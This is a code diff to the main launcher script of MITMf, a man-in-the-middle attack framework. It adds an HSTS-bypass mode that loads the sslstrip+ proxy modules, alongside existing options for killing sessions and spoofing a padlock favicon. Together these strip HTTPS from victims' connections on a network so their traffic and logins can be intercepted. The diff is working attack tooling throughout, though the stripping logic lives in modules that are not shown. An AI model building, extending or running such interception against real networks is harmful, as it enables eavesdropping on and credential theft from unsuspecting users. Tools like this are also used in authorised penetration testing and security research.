@@ -3,8 +3,6 @@
 from twisted.web import http
 from twisted.internet import reactor
 
-from sslstrip.StrippingProxy import StrippingProxy
-from sslstrip.URLMonitor import URLMonitor
 from sslstrip.CookieCleaner import CookieCleaner
 from sslstrip.ProxyPlugins import ProxyPlugins
 
@@ -15,7 +13,7 @@ import argparse
 from plugins import *
 plugin_classes = plugin.Plugin.__subclasses__()
 
-mitmf_version = "0.6"
+mitmf_version = "0.7"
 sslstrip_version = "0.9"
 sergio_version = "0.2.1"
 
@@ -34,6 +32,7 @@ if __name__ == "__main__":
     sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
     sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")
     sgroup.add_argument('-d', '--disable-proxy', dest='disproxy', action='store_true', default=False, help='Disable the SSLstrip Proxy')
+    sgroup.add_argument("-b", "--bypass-hsts", dest='hsts', action="store_true", help="Enable HSTS bypass")
 
     #Initialize plugins
     plugins = []
@@ -69,7 +68,7 @@ if __name__ == "__main__":
     load = []
     try:
         for p in plugins:
-            if  getattr(args,p.optname):
+            if  getattr(args, p.optname):
                 p.initialize(args)
                 load.append(p)
     except NotImplementedError:
@@ -78,8 +77,28 @@ if __name__ == "__main__":
     #Plugins are ready to go, start MITMf
     if args.disproxy:
         ProxyPlugins.getInstance().setPlugins(load)
-        reactor.run()
+
+    elif args.hsts:
+        from sslstrip.StrippingProxyHSTS import StrippingProxy
+        from sslstrip.URLMonitorHSTS import URLMonitor
+
+        URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
+        CookieCleaner.getInstance().setEnabled(args.killsessions)
+        ProxyPlugins.getInstance().setPlugins(load)
+
+        strippingFactory              = http.HTTPFactory(timeout=10)
+        strippingFactory.protocol     = StrippingProxy
+
+        reactor.listenTCP(args.listen, strippingFactory)
+
+        print "\n[*] sslstrip v%s by Moxie Marlinspike running..." % sslstrip_version
+        print "[*] sslstrip+ by Leonardo Nve running..."
+        print "[*] sergio-proxy v%s online" % sergio_version
+        
     else:
+        from sslstrip.StrippingProxy import StrippingProxy
+        from sslstrip.URLMonitor import URLMonitor
+
         URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
         CookieCleaner.getInstance().setEnabled(args.killsessions)
         ProxyPlugins.getInstance().setPlugins(load)
@@ -92,7 +111,7 @@ if __name__ == "__main__":
         print "\n[*] sslstrip v%s by Moxie Marlinspike running..." % sslstrip_version
         print "[*] sergio-proxy v%s online" % sergio_version
 
-        reactor.run()
+    reactor.run()
 
     #cleanup on exit
     for p in load:
